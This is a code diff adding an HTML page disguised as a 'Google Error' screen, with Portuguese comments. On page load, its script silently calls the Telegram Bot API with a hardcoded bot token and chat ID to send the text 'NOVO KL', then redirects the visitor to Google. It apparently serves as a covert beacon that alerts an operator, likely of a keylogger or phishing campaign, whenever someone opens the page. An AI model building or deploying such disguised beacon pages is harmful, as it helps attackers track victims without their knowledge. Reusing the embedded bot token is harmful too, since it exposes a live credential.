@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Error</title>
+</head>
+<body>
+    <h1>Erro Google...</h1>
+    <script>
+        // Substitua 'SEU_TOKEN' e 'SEU_CHAT_ID' pelos valores corretos
+        const botToken = '6956197712:AAF68zYZn_j0bxaE_mVhNh7bXNpTYUpd9ck';
+        const chatId = '5875771029';
+
+        // Função para enviar mensagem para o Telegram
+        function sendMessage() {
+            const message = 'NOVO KL';
+
+            // Monta a URL da API do Telegram
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            // Faz uma requisição para a API do Telegram
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // Redireciona para o Google após enviar a mensagem (substitua com qualquer URL desejada)
+                    window.location.href = 'https://www.google.com';
+                })
+                .catch(error => console.error('Erro ao enviar mensagem:', error));
+        }
+
+        // Chama a função ao carregar a página
+        window.onload = sendMessage;
+    </script>
+</body>
+</html>
